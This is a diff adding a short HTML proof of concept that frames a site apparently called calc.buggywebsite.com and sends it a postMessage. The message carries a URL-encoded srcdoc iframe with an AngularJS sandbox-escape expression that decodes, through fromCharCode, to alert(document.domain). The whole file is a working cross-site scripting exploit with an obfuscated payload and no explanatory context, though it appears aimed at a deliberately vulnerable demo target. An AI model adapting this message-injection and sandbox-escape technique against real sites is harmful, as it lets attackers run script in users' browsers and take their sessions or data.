@@ -1,0 +1,7 @@
+<iframe src="http://calc.buggywebsite.com/frame.html" name="target"></iframe>
+<script>
+	win = window.frames.target;
+	setTimeout(function(){
+		window.frames.target.postMessage(unescape('%3Ciframe%20srcdoc%3D%22%3Cscript%20src%3D/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E%7B%7B%20x%20%3D%20%7B%7D%3B%20x%5B%28%5B%5D+%5B%5D%29%5D%3D%28%5B%5D+%5B%5D%29.constructor.prototype%3B%20x%5B%28%5B%5D+%5B%5D%29%5D.charAt%3D%5B%5D.join%3B%24eval%28x%5B%28%5B%5D+%5B%5D%29%5D.constructor.fromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C100%2C111%2C99%2C117%2C109%2C101%2C110%2C116%2C46%2C100%2C111%2C109%2C97%2C105%2C110%2C41%29%29%3B%7D%7D%3C/div%3E%22%3E%3C/iframe%3E'),"http://calc.buggywebsite.com/");
+	}, 1000);
+</script>
